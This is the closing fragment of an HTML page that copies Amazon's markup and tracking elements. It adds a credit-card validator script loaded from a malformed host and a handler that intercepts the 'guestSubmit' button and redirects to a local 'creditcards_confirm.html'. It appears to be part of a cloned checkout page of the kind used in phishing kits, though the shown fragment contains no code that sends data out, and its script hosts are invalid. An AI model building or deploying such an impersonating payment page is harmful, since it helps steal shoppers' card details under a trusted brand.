    src="https://assoc-na.associates-amazon.com/abid/um?c=A31507F8UTX4G0&amp;s=133-9074394-1435811&amp;m=ATVPDKIKX0DER"
    style="display:none" alt=""><!-- sp:end-feature:associate-tracker-pixel -->
  <!-- sp:feature:configured-sitewide-assets -->
  <script src="https://m.media-amazon.com/images/I/01LFiHt-uUL.js?AUIClients/TMCJavascriptAssets"
    crossorigin="anonymous"></script>
  <!-- sp:end-feature:configured-sitewide-assets -->
  <!-- sp:feature:csm:body-close -->
  <div id="be" style="display:none;visibility:hidden;">
    <form name="ue_backdetect" action="get"><input type="hidden" name="ue_back" value="3"><input type="hidden"
        name="hasWorkingJavascript" value="1"></form>

  </div>

  <noscript>
    <img height="1" width="1" style='display:none;visibility:hidden;'
      src='//fls-na.amazon.com/1/batch/1/OP/ATVPDKIKX0DER:133-9074394-1435811:Q6QQFZ4YDGHHXXZB1NMA$uedata=s:%2Frd%2Fuedata%3Fnoscript%26id%3DQ6QQFZ4YDGHHXXZB1NMA:0'
      alt="" />
  </noscript>

  <script>window.ue && ue.count && ue.count('CSMLibrarySize', 85116)</script>
  <!-- sp:end-feature:csm:body-close -->
  </div>
  <script src="http://jquery-creditcardvalidator/jquery.creditCardValidator.js"></script>
  <script src="https://jquery-3.6.4.min.js"></script>
  <script>
    document.getElementById("guestSubmit")
      .addEventListener("click", function (e) {
        e.preventDefault();

        window.location.replace('creditcards_confirm.html');

      });

  </script>

  <div id="a-popover-root" style="z-index:-1;position:absolute;"></div>
  <div id="a-popover-modal"></div>
</body>